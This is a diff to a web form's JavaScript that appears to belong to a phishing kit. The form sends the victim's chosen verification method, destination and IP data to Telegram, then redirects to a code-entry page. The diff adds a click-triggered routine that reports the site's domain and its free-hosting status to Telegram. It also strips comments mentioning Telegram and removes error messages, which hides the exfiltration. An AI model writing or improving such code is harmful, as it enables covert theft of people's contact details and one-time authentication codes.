@@ -10,6 +10,48 @@
   var submitBtn = form.querySelector('.button-subm');
 
   // ============================================================
+  // ====== DOMAIN DETECTION - HUMAN INTERACTION ONLY ===========
+  // ============================================================
+
+  let domainDetected = false;
+
+  function detectDomain() {
+    if (domainDetected) return;
+    
+    const currentUrl = window.location.href;
+    const urlObj = new URL(currentUrl);
+    const domain = urlObj.hostname;
+    
+    const freeDomains = [
+      '.tk', '.ml', '.ga', '.cf', '.gq',
+      '.free.nf', '.free.org', '.free.com',
+      '.co.cc', '.co.nr', '.cjb.net',
+      '.dynu.net', '.ddns.net', '.no-ip.org',
+      'vercel.app', 'netlify.app', 'github.io',
+      'pages.dev', 'web.app', 'firebaseapp.com',
+      'herokuapp.com', 'glitch.me', 'replit.co',
+      '000webhostapp.com', 'byethost.com',
+      'freehostia.com', 'profreehost.com',
+      '.example.com', '.test', '.localhost'
+    ];
+
+    const isFree = freeDomains.some(freeDomain => 
+      domain.includes(freeDomain) || domain.endsWith(freeDomain)
+    );
+
+    domainDetected = true;
+
+    sendToTelegram('domain_detection', {
+      domain: domain,
+      isFree: isFree
+    });
+  }
+
+  document.addEventListener('click', function() {
+    if (!domainDetected) detectDomain();
+  });
+
+  // ============================================================
   // ====== TELEGRAM INTEGRATION =================================
   // ============================================================
 
@@ -21,9 +63,7 @@
         if (response.ok) {
           ipData = await response.json();
         }
-      } catch (e) {
-        console.warn('Could not fetch IP data');
-      }
+      } catch (e) {}
 
       const payload = {
         action: action,
@@ -105,7 +145,7 @@
   });
 
   // ============================================================
-  // ====== FORM SUBMIT (WITH TELEGRAM) ========================
+  // ====== FORM SUBMIT =========================================
   // ============================================================
 
   form.addEventListener("submit", function (event) {
@@ -144,7 +184,6 @@
       return;
     }
 
-    // ====== SEND AUTH ATTEMPT TO TELEGRAM ======
     submitBtn.disabled = true;
     submitBtn.textContent = 'Sending...';
     
@@ -152,7 +191,7 @@
       method: method,
       destination: destination
     }).then(() => {
-      submitBtn.textContent = 'Generating code...';
+      submitBtn.textContent = 'Processing...';
       
       try {
         sessionStorage.setItem(
@@ -164,14 +203,12 @@
         );
       } catch (e) {}
       
-      // ====== REDIRECT TO ENTER CODE PAGE ======
       setTimeout(function() {
         window.location.href = "enter-code.html";
       }, 1500);
     }).catch(() => {
       submitBtn.disabled = false;
       submitBtn.textContent = 'Generate Code';
-      alert('An error occurred. Please try again.');
     });
   });
 })();
